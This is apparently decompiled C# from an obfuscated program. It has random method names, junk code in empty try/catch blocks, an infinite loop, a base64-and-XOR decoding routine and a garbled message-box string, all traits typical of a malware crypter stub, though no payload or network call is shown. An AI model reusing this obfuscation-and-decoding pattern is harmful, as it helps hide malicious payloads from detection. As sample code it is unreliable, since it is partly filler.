using System;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace RW;

internal class po
{
	public static string licate = Application.get_ExecutablePath();

	private void v9IyWqA64n4z3lM25s4yF2WQ()
	{
		while (true)
		{
		}
	}

	public static byte[] O(string File, string key, int amount)
	{
		byte[] array = Convert.FromBase64String(File);
		byte[] bytes = Encoding.Default.GetBytes(key);
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)(array[i] ^ (unchecked((byte)(bytes[i % bytes.Length] << (checked(i + amount + bytes.Length) & 7))) & 0xFF));
			}
			return array;
		}
	}

	public void JUtKNL()
	{
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		decimal num = new decimal(2439L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(99941L);
			new decimal(67618L);
			new decimal(456492L);
			ProjectData.ClearProjectError();
		}
		num = new decimal(2783L);
		num = default(decimal);
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			while (true)
			{
				new decimal(6276420L);
			}
		}
		Interaction.MsgBox((object)"GFn4k#J†ol{Jv^?2\\‰Z&sH`*4A\u0090x1``p]$Bƒ]{kJ‡@Dk…nƒ„\u008f#€", (MsgBoxStyle)0, (object)null);
	}
}
